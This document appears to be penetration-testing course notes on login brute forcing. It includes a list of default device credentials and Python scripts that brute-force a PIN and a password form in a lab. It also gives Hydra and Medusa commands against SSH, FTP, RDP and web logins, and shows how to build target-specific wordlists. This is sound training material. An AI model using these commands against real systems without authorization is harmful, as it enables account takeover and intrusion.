# Login Brute Forcing

## Introduction

Trial-and-error method to crack passwords, credentials, or encryption keys by systematically trying every possible combination.

Success depends on password complexity, attacker computational power, and defenses in place (account lockouts, CAPTCHAs).

### Types of Brute Forcing

`Simple Brute Force` all combinations within a set/length | `Dictionary Attack` pre-compiled wordlist of common passwords | `Hybrid Attack` dictionary words with appended/prepended chars | `Credential Stuffing` reuses leaked creds across services | `Password Spraying` few common passwords against many usernames, avoids lockouts | `Rainbow Table` precomputed hash tables to reverse hashes | `Reverse Brute Force` one password against many usernames | `Distributed Brute Force` workload split across multiple machines

## Password Security Fundamentals

Password strength (length, complexity, uniqueness, randomness) determines resistance to brute-forcing.

### The Anatomy of a Strong Password

NIST: minimum 12 characters, mix of character types, unique per account, random (no dictionary words or personal info).

### Common Password Weaknesses

Short (<8 chars), dictionary words/names, personal info (birthdates, pet names), reused across accounts, predictable patterns (`qwerty`, `123456`, `p@ssw0rd`).

### The Perils of Default Credentials

Default credentials are often simple and well known, giving an easy entry point.

`Linksys` admin/admin | `D-Link` admin/admin | `Netgear` admin/password | `TP-Link` admin/admin | `Cisco` cisco/cisco | `Asus` admin/admin | `Belkin` admin/password | `Zyxel` admin/1234 | `Samsung SmartCam` admin/4321 | `Hikvision DVR` admin/12345 | `Axis IP Camera` root/pass | `Ubiquiti UniFi AP` ubnt/ubnt | `Canon Printer` admin/admin | `Honeywell Thermostat` admin/1234 | `Panasonic DVR` admin/12345

Default usernames narrow the attack surface even after passwords are changed. Common usernames list: `top-usernames-shortlist.txt` (SecLists).

## Brute Force Attacks

Math behind brute-force difficulty: password length and character set size determine total combinations and cracking time.

`Possible Combinations = Character Set Size ^ Password Length`

`6 lowercase` 26^6 ≈ 309M | `8 lowercase` 26^8 ≈ 209B | `8 upper+lower` 52^8 ≈ 53.5T | `12 full charset (94)` 94^12 ≈ 4.76×10^23

`1M pw/s` 8-char alnum ≈ 6.92 yrs | `1T pw/s` 12-char full ASCII ≈ 15,000 yrs

### Cracking the PIN

Demo: brute-force a 4-digit PIN endpoint via HTTP GET requests.

```python
import requests

ip = "<TARGET_IP>"  # Change this to your instance IP address
port = <PORT>       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## Dictionary Attacks

Tests a pre-compiled wordlist of likely passwords instead of trying all combinations. Faster against weak or common passwords.

`rockyou.txt` leaked passwords (RockYou breach) | `top-usernames-shortlist.txt` common usernames | `xato-net-10-million-usernames.txt` large username list | `2023-200_most_used_passwords.txt` top 200 passwords of 2023 | `Default-Credentials/default-passwords.txt` default device/router creds

### Throwing a dictionary at the problem

PoC: brute-force a password-only login endpoint using a downloaded wordlist.

```python
import requests

ip = "<TARGET_IP>"  # Change this to your instance IP address
port = <PORT>       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

## Hybrid Attacks

Combines dictionary and brute force: mutates wordlist entries (append/prepend numbers, symbols, years) to match predictable password changes.

Filter a wordlist to match a password policy (example: min 8 chars, upper+lower+digit) using chained grep.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt # min length 8
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt # require uppercase
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt # require lowercase
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt # require digit
```

## Hydra

Fast, parallel network login cracker supporting many protocols (SSH, FTP, HTTP, databases, RDP, etc.).

```bash
sudo apt-get -y update
sudo apt-get -y install hydra
```

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

`-l LOGIN`/`-L FILE` single/list username | `-p PASS`/`-P FILE` single/list password | `-t TASKS` parallel tasks | `-f` stop after first success | `-s PORT` non-default port | `-v`/`-V` verbose/more verbose

`ftp` FTP login | `ssh` SSH login | `http-get`/`http-post-form` HTTP auth/login forms | `smtp` mail submission login | `pop3` mail retrieval login | `imap` mail access login | `mysql` MySQL DB login | `mssql` MSSQL DB login | `vnc` remote desktop login | `rdp` RDP login

### Brute-Forcing HTTP Authentication

```bash
hydra -L <USERLIST> -P <WORDLIST> <TARGET_DOMAIN> http-get
```

### Targeting Multiple SSH Servers

Same credential pair against a list of target hosts.

```bash
hydra -l root -p toor -M <TARGET_FILE> ssh # -M target list file
```

### Testing FTP Credentials on a Non-Standard Port

```bash
hydra -L <USERLIST> -P <WORDLIST> -s <PORT> -V <TARGET_DOMAIN> ftp
```

### Brute-Forcing a Web Login Form

```bash
hydra -l <USERNAME> -P <WORDLIST> <TARGET_DOMAIN> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

### Advanced RDP Brute-Forcing

```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <TARGET_IP> rdp # -x min:max:charset bruteforce
```

## Basic HTTP Authentication

Challenge-response scheme: server sends 401 + WWW-Authenticate, client sends base64(user:pass) in the Authorization header.

```http
GET /protected_resource HTTP/1.1
Host: <TARGET_DOMAIN>
Authorization: Basic <BASE64_CREDENTIALS>
```

### Exploiting Basic Auth with Hydra

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
hydra -l <USERNAME> -P 2023-200_most_used_passwords.txt <TARGET_IP> http-get / -s <PORT>
```

## Login Forms

Custom HTML forms submit credentials via POST. Common brute-force target beyond Basic Auth.

### http-post-form

Hydra module for POST-based login forms.

```bash
hydra [options] <TARGET_DOMAIN> http-post-form "path:params:condition_string"
```

### Understanding the Condition String

`F=` failure match text | `S=` success match (status code or text)

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" # match failure text
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302" # match success status
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard" # match success text
```

### Manual Inspection

Browser dev tools: inspect form HTML for method and field names.

### Browser Developer Tools

Network tab captures the POST request: form data, headers, response.

### Proxy Interception

Burp Suite or OWASP ZAP intercepts traffic for complex multi-step forms.

### Constructing the params String for Hydra

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <TARGET_IP> -s <PORT> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Medusa

Fast, massively parallel, modular login brute-forcer supporting many services.

```bash
sudo apt-get -y update
sudo apt-get -y install medusa
```

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

`-h HOST`/`-H FILE` single/list target | `-u USER`/`-U FILE` single/list username | `-p PASS`/`-P FILE` single/list password | `-M MODULE` module to use | `-m "OPT"` module-specific options | `-t TASKS` parallel attempts | `-f`/`-F` stop after first success (host/any) | `-n PORT` non-default port | `-v LEVEL` verbosity (1-6)

`ftp` FTP login | `http` HTTP GET/POST form login | `imap` mail access login | `mysql` MySQL DB login | `pop3` mail retrieval login | `rdp` RDP login | `ssh` SSHv2 login | `svn` Subversion repo login | `telnet` Telnet login | `vnc` remote desktop login | `web-form` HTTP POST form login

### Targeting an SSH Server

```bash
medusa -h <TARGET_IP> -U <USERLIST> -P <WORDLIST> -M ssh
```

### Targeting Multiple Web Servers with Basic HTTP Authentication

```bash
medusa -H <TARGET_FILE> -U <USERLIST> -P <WORDLIST> -M http -m GET
```

### Testing for Empty or Default Passwords

```bash
medusa -h <TARGET_IP> -U <USERLIST> -e ns -M <MODULE>
```

`-e n` empty password | `-e s` password equals username

## Web Services

SSH: encrypted remote access, default port 22. FTP: file transfer, cleartext credentials. Both vulnerable to weak-password brute force.

### Kick-off

Brute-force SSH with a known username.

```bash
medusa -h <TARGET_IP> -n <PORT> -u <USERNAME> -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

```bash
ssh <USERNAME>@<TARGET_IP> -p <PORT>
```

### Expanding the Attack Surface

After SSH access, enumerate other listening services.

```bash
netstat -tulpn | grep LISTEN
nmap localhost
```

`-t` tcp | `-u` udp | `-l` listening | `-p` show pid/program | `-n` numeric (no DNS)

### Targeting the FTP Server

Username guessed from `/home` directory listing.

```bash
medusa -h 127.0.0.1 -u <USERNAME_2> -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

127.0.0.1 forces Medusa to use IPv4.

### Retrieving The Flag

```bash
ftp ftp://<USERNAME_2>:<PASSWORD>@localhost
```

```text
ftp> get <FILE>
```

## Custom Wordlists

Tailored wordlists built from OSINT on a specific target increase brute-force efficiency versus generic lists like rockyou or SecLists.

### Username Anarchy

Generates username permutations (initials, substitutions, concatenations) from a target's name.

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy <FIRST_NAME> <LAST_NAME> > <OUTPUT_FILE>
```

### CUPP

Generates a personalized password wordlist from OSINT profile data (name, dates, pets, employer, interests).

```bash
sudo apt install cupp -y
cupp -i
```

Filter CUPP output for a policy: min 6 chars, upper+lower+digit, 2+ special chars from `!@#$%^&*`.

```bash
grep -E '^.{6,}$' <WORDLIST> | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > <OUTPUT_FILE>
```

```bash
hydra -L <USERLIST> -P <WORDLIST> <TARGET_IP> -s <PORT> -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```